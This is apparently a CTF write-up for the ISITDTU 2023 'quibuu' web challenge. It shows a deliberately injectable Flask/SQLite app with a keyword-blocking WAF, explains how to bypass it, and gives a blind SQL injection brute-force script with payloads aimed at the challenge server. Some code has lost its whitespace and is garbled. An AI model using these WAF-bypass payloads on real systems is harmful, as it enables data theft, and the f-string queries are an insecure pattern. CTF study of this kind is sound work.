# quibuu

Source: ISITDTU CTF 2023
Technique: Blind SQL Injection
Fields: Web

- app.py
    
    ```python
    from flask import Flask, render_template, request
    import random
    import re
    import urllib.parse
    import sqlite3
    #-----------------------------------------------------------------------------------
    app = Flask(__name__)
    
    # waf prevent potential dangerous word that can be in a sqli payload
    def waf_cuc_chill(ans):
    # idk, I thought too much of a good thingans = urllib.parse.quote(ans)
        pattern = re.compile(r'(and|0r|substring|subsrt|if|case|cast|like|>|<|(?:/\%2A.*?\%2A/)|\\|~|\+|-|when|then|order|name|url|;|--|into|limit|update|delete|drop|join|version|not|hex|load_extension|round|random|lower|replace|likely|iif|abs|char|unhex|unicode|trim|offset|count|upper|sqlite_version\(\)|#|true|false|max|\^|length|all|values|0x.*?|left|right|mid|%09|%0A|%20|\t)', re.IGNORECASE)
    
        if pattern.search(ans):
            returnTruereturnFalse@app.route("/", methods=["GET"])
    
    #-------------------------------------------------------------------------------     
    def index():
        ran = random.randint(1, 11)
        id, ans= request.args.get("id", default=f"{ran}"), request.args.get("ans", default="")
    
        ifnot (idand str(id).isdigit()and int(id) >= 1and int(id) <= 1301):
            id = 1
    		#connect db
        db = sqlite3.connect("hehe.db")
        cursor = db.execute(f"SELECT URL FROM QuiBuu WHERE ID = {id}")
        img = cursor.fetchone()[0]
    
        if waf_cuc_chill(ans):
            return render_template("hack.html")
    
        cursor = db.execute(f"SELECT * FROM QuiBuu where ID = {id} AND Name = '{ans}'")
        result = cursor.fetchall()
    
        check = 0
        if result != []:
            check = 1
        elif result == []and ans != "" :
            check = 2
    
        return render_template("index.html", id=id, img=img, ans=ans, check=check)
    #-------------------------------------------------------------------------------
    if __name__ == "__main__":
        app.run()
    ```
    

The database gives many ID and after searching a little bit, I found the flag in ID 1337.

![https://hackmd.io/_uploads/S1MvgpZN6.png](https://hackmd.io/_uploads/S1MvgpZN6.png)

And we can inject into the id but also need to bypass the function

waf_cuc_chill()

**Idea:**

> Inject id and create a new table name F that concat with table QuiBuu and choose the id 1337 to get the flag.This need to brute the flag in url (Blind SQL Injection) to get the real flag in the column URL. In this challenge i use instr ( Link). Note: I didn’t see the author only filter substring and subsrt but left the substr until the author talk that to me after this CTF end lul.
> 
- exploit script
    
    ```python
    import requests
    import string
    
    # payload = "'OR SELECT * FROM QuiBuu WHERE ID = 1 UNION SELECT 1,2,F.`3` FROM (SELECT 1,2,3 UNION SELECT * FROM QuiBuu WHERE id=1337)F/*".replace(" ","%0c")
    # payload = "abc'OR SELECT GROUP_CONCAT(F.`3`) FROM (SELECT 1,2,3 UNION SELECT * FROM QuiBuu WHERE id=1337)F".replace(" ","%0c")
    # payload = "a' OR (SELECT instr((SELECT GROUP_CONCAT(F.`3`) FROM ( SELECT 1,2,3 UNION SELECT * FROM QuiBuu WHERE id=1337)F),\"ISITDTU\"))/*".replace(" ","%0c")
    flag = ""
    url = "http://20.198.223.134:1301/?id=1&ans="
    
    whileTrue:
      for c in string.printable: #tat ca ki tu co the in dc: chu, so, ki tu db, dau cach, control characters(\t\n\r,...)
        if c not in ['*','+','.','?','|', '#', '&', '$']: #loai bo cac ki tu nhay cam khi dua vao url
            payload = ("a' OR (SELECT instr((SELECT GROUP_CONCAT(F.`3`) FROM ( SELECT 1,2,3 UNION SELECT * FROM QuiBuu WHERE id=1337)F),\""+flag+c+"\"))/*").replace(" ","%0c")
            #  thực hiện yêu cầu GET tới máy chủ mục tiêu, gắn payload SQL Injection vào tham số ans của URL.
            r = requests.get(url + payload, stream=True)
     
            if 'Haha QuiBuu!'in r.text:
                print(f" [+] Brute flag successfully : {flag+c}")
                flag += c
    ```